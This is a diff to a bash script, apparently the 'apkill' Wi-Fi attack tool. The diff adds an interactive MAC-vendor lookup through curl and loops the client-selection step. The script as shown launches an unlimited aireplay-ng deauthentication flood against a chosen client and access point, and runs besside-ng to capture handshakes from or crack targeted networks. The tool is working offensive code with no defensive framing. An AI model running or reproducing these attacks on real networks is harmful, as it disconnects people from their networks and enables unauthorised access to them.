@@ -1,7 +1,7 @@
 #!/bin/bash
 # https://github.com/deadport/apkill
 # Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks.
-# Dependencies: net-tools, egrep, aircrack-ng, macchanger
+# Dependencies: net-tools, egrep, aircrack-ng, macchanger, curl
 
 #dependency check 
 chan=0
@@ -15,6 +15,11 @@ if [ ! -f '/usr/bin/aircrack-ng' ]
 		echo "loading aircrack.."
 		sudo apt install aircrack-ng -y > /dev/null
 fi
+if [ ! -f '/usr/bin/curl' ]
+	then
+		echo "loading curl"
+		sudo apt install curl -y > /dev/null
+fi
 if [ ! -f '/bin/egrep' ]
 	then
 		echo "loading egrep.."
@@ -23,7 +28,7 @@ fi
 if [ ! -f '/sbin/iwlist' ]
 	then
 		echo "loading net-tools.."
-		sudo apt install net-tools iw -y > /dev/null
+		sudo apt install net-tools -y > /dev/null
 fi
 if [ ! -d '/etc/macchanger' ]
 	then
@@ -100,19 +105,31 @@ if [ $ask -eq 2 ]
 		tput sgr0
 		exit 0
 fi
-if [ $ask -eq 1 ]
-	then
+while [ $ask -eq 1 ]
+	do
+		trap 'sudo airmon-ng stop $monitor > /dev/null && exit' INT
+		vendor=y
 		echo "How long should be searched for Clients? [sec]:"
 		read secs
 		echo "reading clients from network.. [scanning $secs seconds]"
 		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $monitor
 		echo "Client MAC:"
-		read clientmac
-		tput setaf 1
-		sudo aireplay-ng -0 0 -a $macacc -c $clientmac $monitor
-		sudo airmon-ng stop $monitor > /dev/null
-		tput sgr0
-		exit 0
+		while [ $vendor = y ]
+		do
+			read clientmac
+			echo "Gathering vendor information.."
+			curl "https://api.macvendors.com/$clientmac" && echo \n
+			echo "Do you want to choose this client? [n/y]" 
+			read vendor
+			if [ $vendor = y ] || [ $vendor = Y ]
+			then
+				tput setaf 1
+				sudo aireplay-ng -0 0 -a $macacc -c $clientmac $monitor
+				sudo airmon-ng stop $monitor > /dev/null
+				tput sgr0
+			fi
+		done
+	done
 fi
 if [ $ask -eq 3 ]
 	then
@@ -155,7 +172,7 @@ if [ $ask -eq 4 ]
 			then
 				tput setaf 1
 				sudo airmon-ng start $inter > /dev/null
-				trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+				trap 'tput setaf 1 && echo "deactivating monitor mode.." && sudo airmon-ng stop $monitor > /dev/null && exit 1' INT
 				sudo besside-ng $monitor
 				tput sgr0
 			else
@@ -166,7 +183,7 @@ if [ $ask -eq 4 ]
 				echo "choose AP Channel:"
 				read chan
 				sudo airmon-ng start $inter $chan > /dev/null
-				trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+				trap 'tput setaf 1 && echo "deactivating monitor mode.." && sudo airmon-ng stop $monitor > /dev/null && exit 1' INT
 				sudo besside-ng -b $clientmac $monitor
 				tput sgr0
 		fi
